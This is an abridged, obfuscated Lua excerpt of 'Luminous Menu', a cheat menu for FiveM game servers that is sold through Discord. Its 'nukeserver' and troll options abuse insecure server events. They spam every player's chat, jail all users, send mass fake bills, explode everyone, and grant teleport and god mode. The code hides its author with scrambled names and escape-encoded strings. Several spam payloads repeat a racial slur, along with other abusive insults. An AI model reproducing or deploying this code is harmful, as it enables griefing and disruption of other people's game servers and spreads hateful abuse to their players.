...
local Keys = {
  ...
  ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["1"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177, 
...
function Wugr4yfgb(id, title)
    ...
    menus[id].titleBackgroundColor = { r = 180, g = 63, b = 191, a = 180 }
    menus[id].titleBackgroundSprite = WADUI

    menus[id].menuTextColor = { r = 0, g = 0, b = 0, a = 255 }
    menus[id].menuSubTextColor = { r = 0, g = 0, b = 0, a = 255 }
    menus[id].menuFocusTextColor = { r = 60, g = 60, b = 60, a = 200 }
    menus[id].menuFocusBackgroundColor = { r = 217, g = 17, b = 237, a = 180 }
    menus[id].menuBackgroundColor = { r = 180, g = 63, b = 191, a = 180 }

    menus[id].subTitleBackgroundColor = { r = 180, g = 63, b = 191, a = 180 }
                ...
                Citizen.CreateThread(
                    function()
                        ...
                        for bD = 0, 9 do
                            udwdj(
                                '_chat:messageEntered',
                                '~g~\80\108\97\110\101\35\48\48\48\55\10 ~r~Luminous',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '~b~https://discord.gg/pQwzbdf'
                            )
                        end
                        for i = 0, 256 do
                            udwdj(
                            ...
                            udwdj(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                '~g~\80\108\97\110\101\35\48\48\48\55\10 ~r~Luminous ~b~https://discord.gg/pQwzbdf',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            udwdj("_chat:messageEntered","~r~",{141,211,255},"Luminous ~b~https://discord.gg/pQwzbdf")
        end
        ...
        while waduyh487r64 do
			...
			if chatspam then
                udwdj(
                    ...
                    {0, 0x99, 255},
                    '/ooc Luminous Menu https://discord.gg/pQwzbdf'
                )
                udwdj('_chat:messageEntered', '^8LuminousMenu', {0, 0x99, 255}, '^3You just got fucked by Luminous ^2Made by Manze#6666 ^1Purchase at ^4Manze#6666')
				else
			...
			if banallusers then
				...
				udwdj("js:jailuser", GetPlayerServerId(i), 45 * 60, "~r~Got Fucked By Luminous ~g~\80\108\97\110\101\35\48\48\48\55\10 ~b~https://discord.gg/pQwzbdf")
				udwdj("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "~r~Got Fucked By Luminous ~g~\80\108\97\110\101\35\48\48\48\55\10 ~b~https://discord.gg/pQwzbdf")
					end
				end
      ...
      if IsControlPressed(0, 19) then
        ...
        SetEntityCoordsNoOffset(ped,x,y,z,waduyh487r64,waduyh487r64,waduyh487r64)
            ...
            if VehGod and IsPedInAnyVehicle(PlayerPedId(), waduyh487r64) then
				...
				if discspam then
							TriggerServerEvent("esx:jackingcar", "Luminous Menu")
							TriggerServerEvent("esx:jackingcar", "https://discord.gg/5HUxbTh")
							TriggerServerEvent("esx:jackingcar", "Made by Plane#0007")
							TriggerServerEvent("esx:jackingcar", "Get fucked you whore")
							TriggerServerEvent("esx:jackingcar", "EZ Fivem mod menu")
							TriggerServerEvent("esx:jackingcar", "Buy from Plane#0007")
							TriggerServerEvent("esx:jackingcar", "NIGGER")
							TriggerServerEvent("esx:jackingcar", "NIGGER")
							TriggerServerEvent("esx:jackingcar", "NIGGER")
							TriggerServerEvent("esx:jackingcar", "NIGGER")
				end
		...
		if discordPresence then
                    ...
                    SetDiscordRichPresenceAsset('luminous')
                    
            SetRichPresence('Made by \80\108\97\110\101\35\48\48\48\55\10 | https://discord.gg/pQwzbdf')
			
                    SetDiscordRichPresenceAssetText('Luminous Menu | \80\108\97\110\101\35\48\48\48\55\10')
                
                    SetDiscordRichPresenceAssetSmall('luminous')
            
                    SetDiscordRichPresenceAssetSmallText('Contact \80\108\97\110\101\35\48\48\48\55\10 For Purchase')
...
Citizen.CreateThread(
    function()
        ...
        Wugr4yfgb("\77\97\105\110\77\101\110\117\10", "Luminous")
        ...
        local SelectedPlayer
            ...
            elseif Plane.IsMenuOpened("\86\82\80\77\101\110\117\10") then
                ...
                elseif Plane.IsMenuOpened("InfoMenu") then
                    if IlIlIlIlIlI("Luminous Version 1.0") then
					elseif IlIlIlIlIlI("https://discord.gg/pQwzbdf") then
                    end
    
                    ililililil()
                elseif Plane.IsMenuOpened("Credits") then
				if     IlIlIlIlIlI("~h~Press on our names <3") then
				elseif IlIlIlIlIlI("∑  ~r~~h~Plane#0007~s~ - Owner & Developer") then
				adyt23h23('~r~~h~Creator of the Luminous Menu')
				adyt23h23('~h~Contact him for bug reports etc.')
				adyt23h23('~h~Also contact him if you want to purchase the menu.')
				elseif IlIlIlIlIlI("∑  ~r~~h~Melon#1249~s~ - Legend") then
				adyt23h23('~r~~h~Creator of the Desudo Executor')
				adyt23h23('~h~Huge help, big shoutout.')
				elseif IlIlIlIlIlI("∑  ~o~~h~Not Soviet Bear#6205~s~ - Helping tons") then
				adyt23h23('~r~~h~Big help, go add him on discord for support!')
				elseif IlIlIlIlIlI("∑  ~h~~b~Notorius#5267~s~ - Helping tons") then
				adyt23h23('~r~~h~Huge help, tons of props to him')
				adyt23h23('~h~Suggestion machine 101')
				elseif IlIlIlIlIlI("∑  Fallen#0811") then
				adyt23h23('~r~~h~Made many of these functions possible')
				adyt23h23('~h~Good cracker :p')
				elseif IlIlIlIlIlI("∑  Cat#5955") then
				adyt23h23('~r~~h~Mad lad, dont get him angry')
				adyt23h23('~h~jk, love you cat <3')
				adyt23h23('~h~By the way, ~y~M~o~a~y~n~o~g~y~o')
				elseif IlIlIlIlIlI("∑  Flacko#0307") then
            ...
            elseif Plane.IsMenuOpened("\84\114\111\108\108\77\101\110\117\10") then
                ...
                then
                elseif IlIlIlIlIlI('~r~ISIS Explode everyone') then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) then
				...
				for i = 0, 128 do
                    udwdj('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Luminous Menu https://discord.gg/pQwzbdf \80\108\97\110\101\35\48\48\48\55\10", "6969696969")
                end
			...
			RCCar.Start()
                ...
                elseif IlIlIlIlIlI("Lock closest vehicle") then
                    local playerPed = PlayerPedId()
...
--                    end
                    ...
                    elseif IlIlIlIlIlI("Unlock closest vehicle") then
                        local playerPed = PlayerPedId()
                        local coords = GetEntityCoords(playerPed)
    --                    if IsPedInAnyVehicle(playerPed, false) then
    --                        local vehicle = GetVehiclePedIsIn(playerPed, false)
    ...
    --                    end
		 ...
		 elseif IlIlIlIlIlI("Spawn A Custom Vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, waduyh487r64)
						SetVehicleNumberPlateText(playerVeh, "Luminous")
                    else
                        adyt23h23("~r~Model Isn't Valid You Tard")
                    end
    ...
    if not DoesEntityExist(vvvvvvvvvvvvvvvvvvvvvvvv) then
		...
		ililililil()
			...
			if LDOWJDWDdddwdwdad("~r~→  ~s~Ped Menu", "PedMenu") then
				...
				elseif IlIlIlIlIlI("ITS ~h~CHRISTMAS~s~ TIME BITCHES") then
				NetworkOverrideClockTime(12, 12, 0)
                    			            SetForceVehicleTrails(waduyh487r64)
            SetForcePedFootstepsTracks(waduyh487r64)
					SetWeatherTypePersist("XMAS")
        ...
        SetOverrideWeather("XMAS")
		local playerPed = PlayerPedId()
		                    SetPedComponentVariation	(playerPed, 8,		72,			5, 2)					-- Tshirt
	SetPedComponentVariation	(playerPed, 11,		116,			0, 2)					-- torso parts
	SetPedComponentVariation	(playerPed, 3,		82,				0, 2)						-- Amrs
	SetPedComponentVariation	(playerPed, 4,		38,			0, 2)					-- pants
	SetPedComponentVariation	(playerPed, 6,		59,			20, 2)					-- shoes
	SetPedComponentVariation	(playerPed, 1,		76,			0, 2)						-- mask
				elseif IlIlIlIlIlI("~o~Halloween ~s~Time BITCHES") then
				local playerPed = PlayerPedId()
				NetworkOverrideClockTime(23, 50, 0)
									SetWeatherTypePersist("HALLOWEEN")
        SetWeatherTypeNowPersist("HALLOWEEN")
	...
	SetPedComponentVariation	(playerPed, 11,		275,			0, 2)					-- torso parts
	SetPedComponentVariation	(playerPed, 3,		164,				0, 2)						-- Amrs
	SetPedComponentVariation	(playerPed, 4,		107,			0, 2)					-- pants
	SetPedComponentVariation	(playerPed, 6,		84,			0, 2)					-- shoes
	SetPedComponentVariation	(playerPed, 1,		60,			1, 2)						-- mask
    ...
    SetModelAsNoLongerNeeded(keduxben3)
	elseif IlIlIlIlIlI("Halloween Clothes") then
						Deer.Destroy()
		Wait(100)
		local playerPed = PlayerPedId()
	SetPedComponentVariation	(playerPed, 8,		15,			0, 2)					-- Tshirt
	...
	SetPedComponentVariation	(playerPed, 6,		84,			0, 2)					-- shoes
	SetPedComponentVariation	(playerPed, 1,		60,			1, 2)						-- mask
	elseif IlIlIlIlIlI("Random Clothes") then
						Deer.Destroy()
		Wait(100)
		local playerPed = PlayerPedId()
		local PXID = math.random(0, 100)
		local PXID2 = math.random(0, 20)
		local PXID3 = math.random(0, 50)
		local PXID4 = math.random(0, 250)
		local PXID5 = math.random(0, 150)
	SetPedComponentVariation	(playerPed, 8,		PXID4,			0, 2)					-- Tshirt
	SetPedComponentVariation	(playerPed, 11,		PXID4,			0, 2)					-- torso parts
	SetPedComponentVariation	(playerPed, 3,		PXID5,				0, 2)						-- Amrs
	SetPedComponentVariation	(playerPed, 4,		PXID5,			0, 2)					-- pants
	SetPedComponentVariation	(playerPed, 6,		PXID,			0, 2)					-- shoes
	SetPedComponentVariation	(playerPed, 1,		PXID,			1, 2)						-- mask
	...
	ililililil()
            elseif Plane.IsMenuOpened("\79\110\108\105\110\101\80\108\97\121\101\114\115\77\101\110\117\10") then
                ...
                elseif IlIlIlIlIlI('~b~FULL Armour ~s~Player') then
					...
					elseif IlIlIlIlIlI("Pumpkin") then
	...
	SetPedComponentVariation	(playerPed, 1,		60,			1, 2)						-- mask
                ...
                elseif IlIlIlIlIlI("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    ...
                    end -- nr A S D 1 2 3 3 4 5 # 9 9 9 9
